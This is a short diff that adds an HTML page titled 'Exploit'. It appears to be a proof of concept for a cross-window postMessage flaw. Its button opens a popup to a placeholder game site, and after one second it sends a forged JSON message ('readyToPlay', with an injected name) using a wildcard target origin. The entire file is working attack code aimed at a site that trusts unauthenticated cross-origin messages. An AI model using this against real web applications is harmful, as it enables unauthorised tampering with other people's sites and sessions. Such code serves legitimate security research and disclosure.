@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Exploit</title>
+
+	<script>
+		var game_url = "http://sub.somewebsite.com/";
+		function popup(){
+			window.test = open(game_url, "pop", "width=850,height=750,resizable=1");
+			setTimeout(msg, 1000)
+		}
+		function msg(){
+			window.test.postMessage(JSON.stringify({"readyToPlay": true, "name": "Voorivex"}), "*");
+		}
+	</script>
+</head>
+<body>
+
+<h1>Exploit</h1>
+<input type="button" value="Exploit" onclick="popup()" >
+
+</body>
+</html>
